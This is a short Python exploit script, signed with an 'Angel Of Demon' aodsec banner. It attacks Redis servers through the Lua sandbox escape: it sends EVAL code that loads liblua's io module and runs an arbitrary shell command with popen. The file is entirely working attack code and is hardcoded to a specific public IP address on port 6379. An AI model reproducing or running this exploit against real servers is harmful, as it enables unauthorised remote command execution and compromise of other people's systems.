import redis
import sys

def echoMessage():
	version = """  
      [#] Create By ::
        _                     _    ___   __   ____                             
       / \   _ __   __ _  ___| |  / _ \ / _| |  _ \  ___ _ __ ___   ___  _ __  
      / _ \ | '_ \ / _` |/ _ \ | | | | | |_  | | | |/ _ \ '_ ` _ \ / _ \| '_ \ 
     / ___ \| | | | (_| |  __/ | | |_| |  _| | |_| |  __/ | | | | | (_) | | | |
    /_/   \_\_| |_|\__, |\___|_|  \___/|_|   |____/ \___|_| |_| |_|\___/|_| |_|
                   |___/            By https://aodsec.com                                           
    """
	print(version)

def shell(ip,port,cmd):
	lua= 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("'+cmd+'", "r"); local res = f:read("*a"); f:close(); return res'
	r  =  redis.Redis(host = ip,port = port)
	script = r.eval(lua,0)
	print(script)

if __name__ == '__main__':
	echoMessage()
	ip = "103.203.221.232"
	port = "6379"
	#while True:
	cmd = "pwd"
	if cmd == "q" or cmd == "exit":
		sys.exit()
	shell(ip,port,cmd)